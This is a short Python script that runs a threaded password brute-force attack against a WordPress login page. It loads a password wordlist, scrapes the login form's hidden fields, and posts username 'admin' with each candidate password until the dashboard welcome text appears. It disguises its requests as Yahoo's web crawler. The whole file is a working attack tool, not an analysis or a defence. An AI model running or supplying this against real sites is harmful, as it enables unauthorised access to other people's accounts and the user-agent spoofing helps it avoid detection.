from io    import BytesIO
from lxml  import etree
from queue import Queue

import requests
import sys
import threading
import time

agent    = 'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)' # Yahoo web crawler
success  = 'Welcome to WordPress!'
target   = input("Enter the target's wp-login URL: ")
wordlist = "/usr/share/seclists/Passwords/Software/cain-and-abel.txt"

def get_words():
    with open(wordlist) as f:
        raw_words = f.read()

    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words

def get_params(content):
    ''' Receives the HTTP response contnet and retrieves the HTML parameters in a dict.'''
    params      = dict()
    html_parser = etree.HTMLParser()
    tree        = etree.parse(BytesIO(content), parser=html_parser)
    for elem in tree.findall('//input'): # Find all 'input' elements
        name = elem.get('name')  
        if name is not None:
            params[name] = elem.get('value', None)
    return params

class Bruter:
    ''' This class handles all the HTTP requests and manages cookies. '''

    def __init__(self, username, url):
        self.username = username
        self.url      = url
        self.found    = False
        print(f'\nBrute Force Attack begginging on {url}.\n')
        #print("Finished the setup where username = %s\n" %username)

    def run_bruteforce(self, passwords):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()

    def web_bruter(self, passwords):
        session       = requests.Session()      # Automatically handles the cookies
        header        = {'User-Agent': agent}
        response      = session.get(self.url, headers=header)
        params        = get_params(response.content)
        params['log'] = self.username

        while not passwords.empty() and not self.found:
            time.sleep(5)
            passwd = passwords.get()
            print(f'Trying username/password {self.username}/{passwd:<10}')
            params['pwd'] = passwd

            request = session.post(self.url, data=params, headers=header)
            if success in request.content.decode():
                self.found = True
                print(f'Bruteforcing successful.')
                print('Username is %s'   % self.username)
                print('Password is %s\n' % passwd)

if __name__ == '__main__':
    words = get_words()
    b = Bruter('admin', target)
    b.run_bruteforce(words)

